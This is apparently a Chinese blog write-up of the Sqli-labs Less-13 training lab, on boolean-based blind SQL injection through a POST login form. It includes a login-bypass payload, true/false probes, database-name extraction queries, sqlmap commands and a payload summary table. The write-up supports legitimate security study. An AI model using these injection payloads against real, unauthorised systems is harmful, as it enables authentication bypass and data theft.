---
title: Sqli-labs Less-13 Writeup
date: 2026-11-16
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, POST注入, 布尔盲注]
---
## 一、 漏洞概述
- **关卡**：Less-13
- **漏洞类型**：基于布尔逻辑的 POST 型盲注（Boolean-Based Blind POST SQL Injection）
- **注入点**：登录表单的 `uname` 参数
- **闭合方式**：单引号加括号 `')`

## 二、 渗透测试过程

### 1. 探测注入点与闭合方式
访问 Less-13 关卡，页面为登录表单。抓取 POST 请求。
尝试输入 `admin'` 和 `admin"`，页面均未报错，仅提示登录失败。说明后端关闭了报错回显。

尝试测试万能密码，构造闭合：
```text
uname=admin') #&passwd=123&submit=Submit
```

结果：页面提示登录成功。这证明后端 SQL 语句的包裹形式为 ('$uname')，且注释符 # 成功截断了后续密码验证。

### 2. 确认布尔盲注特征

由于无数据回显且无报错，需要通过页面的“状态差异”来判断数据。Less-13 在登录成功时，会返回用户的凭证信息（如用户名和密码明文）；登录失败时仅提示失败。

利用逻辑判断测试状态差异：

· 条件为真：
  ```text
  uname=admin') and 1=1 #&passwd=123&submit=Submit
  ```
  （页面显示登录成功）
· 条件为假：
  ```text
  uname=admin') and 1=2 #&passwd=123&submit=Submit
  ```
  （页面显示登录失败）

由此确认存在基于布尔的盲注漏洞。

### 3. 手工盲注猜解数据

构造条件语句，通过页面是否返回登录成功状态来逐字猜解数据库名：

· 判断数据库名长度：
  ```text
  uname=admin') and length(database())=8 #&passwd=123&submit=Submit
  ```
  （返回成功，说明库名长度为 8）
· 猜解数据库名首字母（ASCII码）：
  ```text
  uname=admin') and ascii(substr(database(),1,1))>100 #&passwd=123&submit=Submit
  ```
  （通过不断调整数值，判断首字母的 ASCII 码值，从而还原出数据库名 security）

注：由于手工盲注效率极低，实战中通常结合 Python 脚本或使用 SQLMap 自动化爆破。

## 三、 自动化利用 (SQLMap)

针对 POST 型盲注，使用 SQLMap 时建议将 Burp Suite 拦截到的请求保存为文件（例如 less13.txt），然后使用 -r 参数进行测试。

```bash
# 直接跑库名（SQLMap 会自动识别 ')' 闭合和布尔盲注技术）
sqlmap -r less13.txt --batch --current-db

# 如果想指定使用布尔盲注技术：
sqlmap -r less13.txt --technique B --batch --current-db
```

## 四、 通关 Payload 汇总

测试目的 Payload (仅限 uname 字段) 页面状态
测试闭合与绕过 admin') # 登录成功
条件为真 admin') and 1=1 # 登录成功
条件为假 admin') and 1=2 # 登录失败
盲注测长度 admin') and length(database())=8 # 登录成功
